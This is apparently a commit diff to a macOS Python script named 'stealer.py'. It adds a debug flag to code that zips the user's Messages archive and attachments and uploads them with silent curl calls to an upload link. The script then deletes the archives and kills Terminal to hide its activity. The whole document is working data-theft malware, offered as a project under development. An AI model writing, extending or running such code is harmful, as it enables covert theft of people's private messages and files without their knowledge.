Added debug

+++ macOSContactStealer/stealer.py
@@ -9,6 +9,7 @@ import sys
 sys.stdout = os.devnull
 
 enableATCH = 1
+debug = 1
 
 home = expanduser("~")
 
@@ -27,12 +28,12 @@ with open(os.devnull, 'w') as fp:
     cmd = subprocess.Popen(['curl', '-sF', 'contact=@{0}.zip'.format(zipname), uploadlink, "&"], stdout=fp)
 # This is not a good way to handle this but works for now
 sleep(1)
-os.unlink(zipname + ".zip")
+if debug is 0:
+    os.unlink(zipname + ".zip")
 
 # Breaks after this
 
 sleep(2)
-
 
 clocation = home + "/Library/Messages/Archive"
 
@@ -42,11 +43,11 @@ zipname = "./{0}-messages".format(user)
 
 shutil.make_archive(zipname, 'zip', clocation)
 
-
 with open(os.devnull, 'w') as fp:
     cmd = subprocess.Popen(['curl', '-sF', 'contact=@{0}.zip'.format(zipname), uploadlink, "&"], stdout=fp)
 sleep(4)
-os.unlink(zipname + ".zip")
+if debug is 0:
+    os.unlink(zipname + ".zip")
 
 if enableATCH is 1:
     clocation = home + "/Library/Messages/Attachments"
@@ -54,10 +55,12 @@ if enableATCH is 1:
     zipname = "./{0}-attachments".format(user)
 
     shutil.make_archive(zipname, 'zip', clocation)
-    subprocess.Popen(['curl', '-F', 'contact=@{0}.zip'.format(zipname), uploadlink])
-    sleep(5)
-    os.unlink(zipname + ".zip")
 
+    with open(os.devnull, 'w') as fp:
+        cmd = subprocess.Popen(['curl', '-sF', 'contact=@{0}.zip'.format(zipname), uploadlink, "&"], stdout=fp)
+    sleep(5)
+    if debug is 0:
+        os.unlink(zipname + ".zip")
 
 subprocess.call(['tput', 'reset'])
 subprocess.call(['killall', 'Terminal'])
